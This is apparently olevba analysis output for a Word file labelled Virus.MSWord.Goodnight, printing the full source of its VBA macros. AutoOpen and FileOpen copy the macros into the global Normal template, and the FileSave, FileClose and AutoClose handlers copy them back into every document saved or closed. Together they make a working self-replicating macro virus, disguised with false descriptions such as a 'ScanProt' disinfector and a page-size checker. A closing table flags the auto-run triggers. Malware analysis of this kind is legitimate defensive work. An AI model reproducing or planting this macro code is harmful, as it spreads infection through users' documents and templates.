olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Goodnight.l-d300fc360236c516026e555468ceb5b4af709ee0
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Goodnight.l-d300fc360236c516026e555468ceb5b4af709ee0 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileCloseAll.bas 
in file: Virus.MSWord.Goodnight.l-d300fc360236c516026e555468ceb5b4af709ee0 - OLE stream: 'Macros/VBA/FileCloseAll'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Closes all of the windows of all documents"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileCloseAll.MAIN"
Dim DocName$


On Error GoTo -1: On Error GoTo bail
DocName$ = WordBasic.[FileName$]()
WordBasic.FileSaveAs Format:=1
WordBasic.MacroCopy "Global:AutoExec", DocName$ + ":AutoExec"
WordBasic.MacroCopy "Global:AutoExit", DocName$ + ":AutoExit"
WordBasic.MacroCopy "Global:AutoClose", DocName$ + ":AutoClose"
WordBasic.MacroCopy "Global:FileClose", DocName$ + ":FileClose"
WordBasic.MacroCopy "Global:FileCloseAll", DocName$ + ":FileCloseAll"
WordBasic.MacroCopy "Global:FileSave", DocName$ + ":FileSave"
WordBasic.MacroCopy "Global:FileOpen", DocName$ + ":FileOpen"
WordBasic.MacroCopy "Global:AutoOpen", DocName$ + ":AutoOpen"
WordBasic.MacroCopy "Global:Exit", DocName$ + ":Exit"
bail:

WordBasic.FileCloseAll
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileClose.bas 
in file: Virus.MSWord.Goodnight.l-d300fc360236c516026e555468ceb5b4af709ee0 - OLE stream: 'Macros/VBA/FileClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Closes all of the windows of the active document"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileClose.MAIN"
Dim DocName$


On Error GoTo -1: On Error GoTo bail
DocName$ = WordBasic.[FileName$]()
WordBasic.FileSaveAs Format:=1
WordBasic.MacroCopy "Global:AutoExec", DocName$ + ":AutoExec"
WordBasic.MacroCopy "Global:AutoExit", DocName$ + ":AutoExit"
WordBasic.MacroCopy "Global:AutoClose", DocName$ + ":AutoClose"
WordBasic.MacroCopy "Global:FileClose", DocName$ + ":FileClose"
WordBasic.MacroCopy "Global:FileCloseAll", DocName$ + ":FileCloseAll"
WordBasic.MacroCopy "Global:FileSave", DocName$ + ":FileSave"
WordBasic.MacroCopy "Global:FileOpen", DocName$ + ":FileOpen"
WordBasic.MacroCopy "Global:AutoOpen", DocName$ + ":AutoOpen"
WordBasic.MacroCopy "Global:Exit", DocName$ + ":Exit"
bail:

WordBasic.FileClose
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Goodnight.l-d300fc360236c516026e555468ceb5b4af709ee0 - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Installed to your NORMAL template as AutoClose to clean the prank macros from any documents that you open then close."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoClose.MAIN"
Dim DocName$

On Error GoTo -1: On Error GoTo bail
DocName$ = WordBasic.[FileName$]()
WordBasic.FileSaveAs Format:=1
WordBasic.MacroCopy "Global:AutoExec", DocName$ + ":AutoExec"
WordBasic.MacroCopy "Global:AutoExit", DocName$ + ":AutoExit"
WordBasic.MacroCopy "Global:AutoClose", DocName$ + ":AutoClose"
WordBasic.MacroCopy "Global:FileClose", DocName$ + ":FileClose"
WordBasic.MacroCopy "Global:FileCloseAll", DocName$ + ":FileCloseAll"
WordBasic.MacroCopy "Global:FileSave", DocName$ + ":FileSave"
WordBasic.MacroCopy "Global:FileOpen", DocName$ + ":FileOpen"
WordBasic.MacroCopy "Global:AutoOpen", DocName$ + ":AutoOpen"
WordBasic.MacroCopy "Global:Exit", DocName$ + ":Exit"
bail:

End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSave.bas 
in file: Virus.MSWord.Goodnight.l-d300fc360236c516026e555468ceb5b4af709ee0 - OLE stream: 'Macros/VBA/FileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves the active document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"
Dim DocName$


On Error GoTo -1: On Error GoTo bail
DocName$ = WordBasic.[FileName$]()
WordBasic.FileSaveAs Format:=1
WordBasic.MacroCopy "Global:AutoExec", DocName$ + ":AutoExec"
WordBasic.MacroCopy "Global:AutoExit", DocName$ + ":AutoExit"
WordBasic.MacroCopy "Global:AutoClose", DocName$ + ":AutoClose"
WordBasic.MacroCopy "Global:FileClose", DocName$ + ":FileClose"
WordBasic.MacroCopy "Global:FileCloseAll", DocName$ + ":FileCloseAll"
WordBasic.MacroCopy "Global:FileSave", DocName$ + ":FileSave"
WordBasic.MacroCopy "Global:FileSaveAs", DocName$ + ":FileSaveAs"
WordBasic.MacroCopy "Global:FileOpen", DocName$ + ":FileOpen"
WordBasic.MacroCopy "Global:AutoOpen", DocName$ + ":AutoOpen"
WordBasic.MacroCopy "Global:Exit", DocName$ + ":Exit"
bail:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileOpen.bas 
in file: Virus.MSWord.Goodnight.l-d300fc360236c516026e555468ceb5b4af709ee0 - OLE stream: 'Macros/VBA/FileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Opens an existing document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileOpen.MAIN"
Dim DocName$


Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
WordBasic.CurValues.FileOpen dlg
WordBasic.Dialog.FileOpen dlg
WordBasic.FileOpen dlg

On Error GoTo -1: On Error GoTo skip
DocName$ = WordBasic.[FileName$]()
WordBasic.MacroCopy DocName$ + ":AutoExec", "Global:AutoExec"
WordBasic.MacroCopy DocName$ + ":AutoExit", "Global:AutoExit"
WordBasic.MacroCopy DocName$ + ":AutoClose", "Global:AutoClose"
WordBasic.MacroCopy DocName$ + ":FileClose", "Global:FileClose"
WordBasic.MacroCopy DocName$ + ":FileCloseAll", "Global:FileCloseAll"
WordBasic.MacroCopy DocName$ + ":FileSave", "Global:FileSave"
WordBasic.MacroCopy DocName$ + ":FileSaveAs", "Global:FileSaveAs"
WordBasic.MacroCopy DocName$ + ":FileOpen", "Global:FileOpen"
WordBasic.MacroCopy DocName$ + ":AutoOpen", "Global:AutoOpen"
WordBasic.MacroCopy DocName$ + ":Exit", "Global:Exit"

skip:

End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Goodnight.l-d300fc360236c516026e555468ceb5b4af709ee0 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Checks Page Size; if not default Page Size, converts document to default Page Size.  FWTMPv7.0"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim DocName$


On Error GoTo -1: On Error GoTo skip
DocName$ = WordBasic.[FileName$]()
WordBasic.MacroCopy DocName$ + ":AutoExec", "Global:AutoExec"
WordBasic.MacroCopy DocName$ + ":AutoExit", "Global:AutoExit"
WordBasic.MacroCopy DocName$ + ":AutoClose", "Global:AutoClose"
WordBasic.MacroCopy DocName$ + ":FileClose", "Global:FileClose"
WordBasic.MacroCopy DocName$ + ":FileCloseAll", "Global:FileCloseAll"
WordBasic.MacroCopy DocName$ + ":FileSave", "Global:FileSave"
WordBasic.MacroCopy DocName$ + ":FileSaveAs", "Global:FileSaveAs"
WordBasic.MacroCopy DocName$ + ":FileOpen", "Global:FileOpen"
WordBasic.MacroCopy DocName$ + ":AutoOpen", "Global:AutoOpen"
WordBasic.MacroCopy DocName$ + ":Exit", "Global:Exit"

skip:

End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoExit.bas 
in file: Virus.MSWord.Goodnight.l-d300fc360236c516026e555468ceb5b4af709ee0 - OLE stream: 'Macros/VBA/AutoExit'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "ScanProt macro to protect and disinfect your Normal (Global) template."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoExit.MAIN"
Dim DocName$


On Error GoTo -1: On Error GoTo bail
DocName$ = WordBasic.[FileName$]()
WordBasic.FileSaveAs Format:=1
WordBasic.MacroCopy "Global:AutoExec", DocName$ + ":AutoExec"
WordBasic.MacroCopy "Global:AutoExit", DocName$ + ":AutoExit"
WordBasic.MacroCopy "Global:AutoClose", DocName$ + ":AutoClose"
WordBasic.MacroCopy "Global:FileClose", DocName$ + ":FileClose"
WordBasic.MacroCopy "Global:FileCloseAll", DocName$ + ":FileCloseAll"
WordBasic.MacroCopy "Global:FileSave", DocName$ + ":FileSave"
WordBasic.MacroCopy "Global:FileOpen", DocName$ + ":FileOpen"
WordBasic.MacroCopy "Global:AutoOpen", DocName$ + ":AutoOpen"
WordBasic.MacroCopy "Global:Exit", DocName$ + ":Exit"
bail:

End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoExec.bas 
in file: Virus.MSWord.Goodnight.l-d300fc360236c516026e555468ceb5b4af709ee0 - OLE stream: 'Macros/VBA/AutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "kinko's KHQ mesage:\r""AutoMacros are now turned off!"""
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoExec.MAIN"
WordBasic.DisableAutoMacros
WordBasic.MsgBox "Auto Macros disabled"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|open                |May open a file                              |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

